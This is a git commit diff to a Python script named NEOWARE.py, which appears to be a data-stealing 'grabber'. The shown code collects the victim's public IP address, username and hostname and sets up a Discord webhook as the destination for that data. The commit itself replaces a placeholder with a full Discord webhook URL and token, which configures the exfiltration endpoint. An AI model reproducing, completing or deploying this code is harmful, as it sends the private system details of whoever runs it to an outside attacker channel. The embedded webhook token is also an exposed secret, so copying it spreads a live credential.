4939669c2854c3b0d71cbe6b5c7fb36b6fdf3430
JonasBecker12671 <sroth9289@gmail.com>
2025-05-17 21:26:04 +0200

    Update NEOWARE.py

--- NEOWARE.py
+++ NEOWARE.py
@@ -225,8 +225,8 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1373368795665530983/ne53MK3FunpX3DJCc5MaWjOwkDG6aniqXc-WLhaXym8y7SwQROApMhMuUIBiqbw-Kn1n" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[Cookie Bot]') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
